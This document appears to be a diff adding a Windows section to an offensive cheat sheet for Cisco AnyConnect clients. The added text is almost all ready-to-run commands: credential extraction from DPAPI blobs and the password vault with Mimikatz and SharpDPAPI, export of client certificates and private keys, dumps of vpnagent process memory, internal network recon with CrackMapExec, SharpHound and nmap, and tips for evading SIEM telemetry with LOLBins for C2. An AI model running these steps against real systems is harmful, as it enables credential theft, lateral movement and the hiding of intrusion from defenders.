@@ -674,3 +674,225 @@ ssh admin@<target>
 show running-config
 show vpn-sessiondb anyconnect
 ```
+
+---
+
+## Windows Client — Enumeration & Extraction
+
+### PowerShell Enumeration
+
+```powershell
+# Installed version
+Get-ItemProperty "HKLM:\SOFTWARE\Cisco\Cisco AnyConnect Secure Mobility Client"
+Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Cisco\Cisco AnyConnect Secure Mobility Client"
+
+# AnyConnect services (vpnagent runs as SYSTEM)
+Get-Service | Where-Object {$_.DisplayName -match "Cisco|AnyConnect"}
+
+# AnyConnect processes
+Get-Process | Where-Object {$_.Name -match "vpn|cisco|acise"}
+# vpnagent.exe — SYSTEM — main VPN daemon
+# vpnui.exe    — user  — GUI
+
+# VPN tunnel adapter (when connected)
+Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "Cisco AnyConnect"}
+Get-NetIPAddress -InterfaceAlias "Cisco AnyConnect*"
+
+# Routes pushed by ASA
+Get-NetRoute | Where-Object {$_.InterfaceAlias -match "Cisco|AnyConnect"} | Select-Object DestinationPrefix, NextHop, RouteMetric
+
+# DNS servers pushed via VPN
+Get-DnsClientServerAddress | Where-Object {$_.InterfaceAlias -match "Cisco|AnyConnect"}
+
+# Windows Firewall rules AnyConnect adds/modifies
+Get-NetFirewallRule | Where-Object {$_.DisplayName -match "Cisco|AnyConnect"} | Select-Object DisplayName, Direction, Action, Enabled
+
+# Registry — last server + username used
+reg query "HKCU\SOFTWARE\Cisco\Cisco AnyConnect Secure Mobility Client\Preferences"
+# LastHost — last VPN server FQDN/IP
+# LastUser — last username
+
+# All Cisco registry keys
+reg query "HKLM\SOFTWARE\Cisco" /s
+```
+
+---
+
+### Profile & Log File Locations (Windows)
+
+```powershell
+# Profile XML files — server list, auth method, split-tunnel policy, TND config
+$profiles = "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile"
+Get-ChildItem $profiles -Filter "*.xml" | ForEach-Object { Get-Content $_.FullName }
+
+# Key profile XML tags
+Select-String -Path "$profiles\*.xml" -Pattern "HostAddress|Authentication|AlwaysOn|TrustedNetwork|SplitTunnel|ServerList|BypassDownloader"
+
+# Log files
+# C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\temp\CiscoAnyConnect.log
+# %APPDATA%\Cisco\Cisco AnyConnect Secure Mobility Client\log\
+# C:\Windows\Temp\AnyConnect\
+
+Get-Content "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\temp\CiscoAnyConnect.log" |
+  Select-String -Pattern "server|group|auth|tunnel|fail|error" | Select-Object -Last 50
+
+# Windows Event Log
+Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Cisco AnyConnect*'} -MaxEvents 50 |
+  Select-Object TimeCreated, Id, Message
+
+# DART bundle — if user ran diagnostics tool, contains full logs + config + profile
+Get-ChildItem C:\Users -Recurse -Filter "DARTBundle*" -ErrorAction SilentlyContinue
+Get-ChildItem C:\Windows\Temp -Filter "DARTBundle*"
+# Unzip and read: contains running-config, profile XML, full debug logs
+```
+
+---
+
+### DPAPI Credential Extraction
+
+```powershell
+# AnyConnect saves credentials as DPAPI blobs (user context)
+# Blob locations:
+dir "$env:APPDATA\Microsoft\Credentials\" /a
+dir "$env:LOCALAPPDATA\Microsoft\Credentials\" /a
+
+# Windows Credential Manager — list Cisco entries
+cmdkey /list | findstr /i "cisco anyconnect vpn"
+
+# PowerShell vault query
+[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | Where-Object {$_.Resource -match "Cisco|vpn"} | ForEach-Object {
+  $_.RetrievePassword(); $_ | Select-Object Resource, UserName, Password
+}
+```
+
+```
+# Mimikatz — decrypt DPAPI blobs
+privilege::debug
+sekurlsa::dpapi
+
+# Decrypt specific blob (as the credential owner or SYSTEM)
+dpapi::cred /in:"C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<blobfile>"
+
+# If SYSTEM — need user master key first
+dpapi::masterkey /in:"C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<masterkey-guid>" /sid:<SID> /password:<password>
+dpapi::cred /in:"<blob>" /masterkey:<hex-masterkey>
+
+# SharpDPAPI (no Mimikatz dependency)
+SharpDPAPI.exe credentials
+SharpDPAPI.exe credentials /unprotect
+```
+
+---
+
+### Client Certificate Extraction
+
+Certificate-based VPN auth stores the client cert + private key in the Windows cert store.
+
+```powershell
+# List personal store certs with private keys
+Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.HasPrivateKey} | Select-Object Subject, Thumbprint, NotAfter
+
+# Find certs with Client Auth EKU (OID 1.3.6.1.5.5.7.3.2)
+Get-ChildItem Cert:\CurrentUser\My | Where-Object {
+  $_.EnhancedKeyUsageList.ObjectId -contains "1.3.6.1.5.5.7.3.2"
+}
+
+# Export as PFX (requires private key marked exportable)
+$thumb = "<thumbprint>"
+$cert = Get-Item "Cert:\CurrentUser\My\$thumb"
+$pwd = ConvertTo-SecureString "Export123!" -AsPlainText -Force
+Export-PfxCertificate -Cert $cert -FilePath C:\Temp\vpncert.pfx -Password $pwd
+
+# certutil alternative
+certutil -exportPFX -p "Export123!" My <thumbprint> C:\Temp\vpncert.pfx
+
+# Non-exportable private key — bypass with Mimikatz crypto module
+# crypto::certificates /export /systemstore:CURRENT_USER
+# crypto::cng
+
+# Use exported cert with OpenConnect on Linux
+openconnect --certificate vpncert.pfx --key vpncert.pfx <vpn-server>
+```
+
+---
+
+### VPN Process Memory (Active Session)
+
+When `vpnagent.exe` is active, session tokens and credentials may be in process memory.
+
+```powershell
+# Get PID
+(Get-Process vpnagent).Id
+
+# ProcDump (requires admin)
+.\procdump64.exe -ma (Get-Process vpnagent).Id C:\Temp\vpnagent.dmp
+
+# Built-in dump via comsvcs.dll (no extra tools)
+$pid = (Get-Process vpnagent).Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Temp\vpnagent.dmp full
+
+# Strings search on dump
+strings C:\Temp\vpnagent.dmp | findstr /i "password token cookie webvpn CSTP"
+
+# Mimikatz minidump parse
+# sekurlsa::minidump vpnagent.dmp
+# sekurlsa::logonpasswords
+```
+
+---
+
+### Post-Connection Recon (Windows)
+
+```powershell
+# Confirm VPN connected — check tunnel adapter
+ipconfig /all | findstr /i "cisco anyconnect tunnel"
+
+# All routes pushed by ASA (internal subnets)
+route print
+Get-NetRoute -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -match "Cisco"} | Select-Object DestinationPrefix
+
+# Internal DNS resolution
+nslookup corp.local <vpn-dns-server>
+Resolve-DnsName -Name "corp.local" -Server <vpn-dns-server> -Type NS
+Resolve-DnsName -Name "_ldap._tcp.corp.local" -Server <vpn-dns-server> -Type SRV
+
+# Test internal connectivity over tunnel
+Test-NetConnection -ComputerName <dc-ip> -Port 445
+Test-NetConnection -ComputerName <dc-ip> -Port 389
+Test-NetConnection -ComputerName <dc-ip> -Port 5985   # WinRM
+
+# Net view internal shares
+net view \\<internal-server> /all
+net use \\<internal-server>\share /user:<domain>\<user> <pass>
+
+# CrackMapExec sweep over VPN
+crackmapexec smb <vpn-subnet>/24 --gen-relay-list relay-targets.txt
+crackmapexec smb <vpn-subnet>/24 -u <user> -p <pass> --shares
+
+# BloodHound collection over VPN
+.\SharpHound.exe -c All --domain corp.local --domaincontroller <dc-ip>
+
+# Nmap over VPN
+nmap -sV -p 22,80,443,445,3389,5985,8080,8443 <vpn-subnet>/24 --open -oA vpn-scan
+```
+
+---
+
+### NVM (Network Visibility Module) — Forensic Artifact
+
+AnyConnect NVM logs process name, destination IP/port, and bytes sent to an enterprise SIEM.
+
+```powershell
+# Check if NVM module is installed/active
+Get-Service | Where-Object {$_.DisplayName -match "NVM|Network Visibility"}
+reg query "HKLM\SOFTWARE\Cisco\Cisco AnyConnect Secure Mobility Client\Network Visibility Module"
+
+# NVM log location — contains full network telemetry
+Get-ChildItem "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\NVM\" -Recurse
+
+# If NVM is active: assume all process/connection activity is logged to SIEM
+# Use LOLBins for C2 to blend in (rundll32, mshta, wscript, certutil)
+# Prefer TLS 443 traffic to blend with AnyConnect tunnel traffic
+```
